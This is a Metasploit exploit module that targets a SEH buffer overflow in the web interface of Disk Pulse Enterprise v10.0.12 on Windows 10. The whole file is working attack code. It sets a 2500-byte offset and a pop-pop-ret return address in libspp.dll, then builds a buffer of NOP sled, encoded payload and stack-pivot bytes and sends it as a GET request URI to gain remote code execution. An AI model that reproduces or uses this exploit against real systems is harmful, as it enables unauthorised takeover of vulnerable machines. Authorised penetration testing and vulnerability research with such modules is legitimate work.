##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Disk Pulse Enterprise GET SEH Buffer Overflow',
      'Description'    => %q{
        This module exploits a SEH buffer overflow vulnerability
        in the web interface of Disk Pulse Enterprise v10.0.12
        caused by improper bounds checking of the requested resource. This
        module has been tested successfully on Windows 10 Pro 1709.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Werebug',
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread'
        },
      'Platform'       => 'win',
      'Payload'        =>
        {
          'BadChars'   => "\x00\x09\x0a\x0d\x20",
        },
      'Targets'        =>
        [
          [ 'Disk Pulse Enterprise v10.0.12',
            {
              'Offset' => 2500,
              'Ret'    => 0x101576c0  # pop pop ret in libspp.dll
            }
          ],
        ],
      'Privileged'     => true,
      'DefaultTarget'  => 0))
  end

  def exploit
    
    buffer = "\x41" * 100
    buffer << "\x90" * 16
    buffer << payload.encoded
    buffer << "\x41" * (target['Offset'] - buffer.length - 4)
    buffer << generate_seh_record(target['Ret'])
    buffer << "\x66\x81\xc4\xf4\x3c" # add sp,15604
    buffer << "\xff\xe4" # jmp esp
    buffer << "\x43" * (6000 - buffer.length)
        
    send_request_cgi(
        'method' => 'GET',
        'uri'    => buffer,
    )
  end
end
